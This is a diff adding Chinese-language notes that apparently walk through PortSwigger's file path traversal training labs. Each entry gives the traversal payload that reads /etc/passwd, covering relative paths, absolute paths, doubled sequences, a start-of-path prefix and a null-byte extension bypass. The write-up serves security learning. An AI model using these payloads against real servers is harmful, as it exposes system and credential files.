@@ -1,0 +1,43 @@
+https://portswigger.net/web-security/file-path-traversal/lab-simple
+请求图片的URL为 
+/image?filename=48.jpg
+修改为
+/image?filename=../../../../../../etc/passwd
+
+# 浏览器中将显示图像存在错误，而在代理服务器中显示响应的头部为图片格式，而体为passwd数据 #
+@ 在burp代理服务器中设置过滤器以显示对图像的请求 @
+
+### 使用绝对路径 ###
+https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
+对图片的请求为
+GET /image?filename=3.jpg HTTP/2
+使用绝对路径
+/image?filename=/etc/passwd
+
+### 服务器非递归地移除遍历序列 ###
+https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively
+对图片的请求为
+GET /image?filename=21.jpg HTTP/2
+加倍普通的遍历路径
+/image?filename=....//....//....//....//etc/passwd
+
+### 使用冗余URL编码 ###
+https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
+对图片的请求为
+GET /image?filename=36.jpg HTTP/2
+修改为
+双重URL编码
+
+### 服务器路径起始验证 ###
+https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path
+对图片的请求为
+GET /image?filename=/var/www/images/8.jpg HTTP/2
+在普通遍历前添加起始路径
+/image?filename=/var/www/images/../../../../../../etc/passwd
+
+### 服务器文件扩展名验证 ###
+https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass
+对图片的请求为
+GET /image?filename=17.jpg HTTP/2
+在普通遍历后添加空字节%00及扩展名.jpg绕过验证
+/image?filename=../../../../../../etc/passwd%00.jpg
